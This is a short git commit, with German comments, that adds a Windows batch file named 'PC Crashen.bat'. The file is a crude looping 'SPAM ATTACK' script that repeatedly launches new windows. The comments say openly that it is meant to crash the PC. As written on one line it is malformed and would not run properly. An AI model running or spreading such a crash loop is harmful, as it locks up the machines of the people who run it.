c50fe3f2bf2fe9823ec714fa7a5d378f36fa5b23
Emil <eb531@web.de>
2021-04-16 20:00:50 +0200

    Die Datei hat keinen Sinn gemacht

---
+++ PC Crashen.bat
@@ -0,0 +1,5 @@
+@echo off color c :A echo SPAM ATTACK ping -n3 start goto A
+" @Lukas das ist eindeutig kein Python script 
+" Soll da sein zum Crachen vom Pc
+" Es ist aber kein python scripts die datei sollte auf .bat enden
+
